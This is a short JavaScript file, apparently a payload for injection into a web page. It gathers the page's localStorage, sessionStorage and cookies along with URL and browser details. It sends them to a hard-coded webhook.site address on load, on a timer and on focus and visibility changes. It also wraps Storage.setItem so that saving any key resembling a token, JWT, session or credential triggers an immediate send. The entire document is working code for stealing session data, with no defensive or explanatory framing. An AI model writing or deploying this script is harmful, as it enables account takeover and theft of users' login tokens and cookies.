(function(){
  try{
    var HOOK='https://webhook.site/ef6b50f9-8930-466b-9588-27c3ea3e7887';
    function dump(s){
      var o={};
      try{
        for(var i=0;i<s.length;i++){
          var k=s.key(i); var v=s.getItem(k);
          if(typeof v==='string' && v.length>4000) v=v.slice(0,4000)+'...[trunc]';
          o[k]=v;
        }
      }catch(e){ o.__err=String(e); }
      return o;
    }
    var last='';
    function snap(reason){
      return {tag:'i2621-session',reason:reason,ts:new Date().toISOString(),
        origin:location.origin,href:location.href,path:location.pathname+location.search,
        ref:document.referrer,ua:navigator.userAgent,vis:document.visibilityState,
        ls:dump(localStorage),ss:dump(sessionStorage),ck:document.cookie};
    }
    function send(reason){
      try{
        var b=JSON.stringify(snap(reason));
        if(b.length>180000) b=b.slice(0,180000);
        if(b===last) return;
        last=b;
        try{ if(navigator.sendBeacon && navigator.sendBeacon(HOOK,b)) return; }catch(e){}
        try{ fetch(HOOK,{method:'POST',mode:'no-cors',body:b}).catch(function(){}); }catch(e){}
      }catch(e){}
    }
    send('load');
    try{window.addEventListener('storage',function(){setTimeout(function(){send('storage');},500);});}catch(e){}
    try{setInterval(function(){send('interval');},20000);}catch(e){}
    try{document.addEventListener('visibilitychange',function(){send('visibility');});}catch(e){}
    try{window.addEventListener('focus',function(){send('focus');});}catch(e){}
    try{
      var orig=Storage.prototype.setItem;
      Storage.prototype.setItem=function(k,v){
        var r=orig.apply(this,arguments);
        try{ if(String(k).search(/token|auth|jwt|session|key|org|user|convex|credential/i)>=0) setTimeout(function(){send('set:'+k);},300); }catch(e){}
        return r;
      };
    }catch(e){}
  }catch(e){}
})();
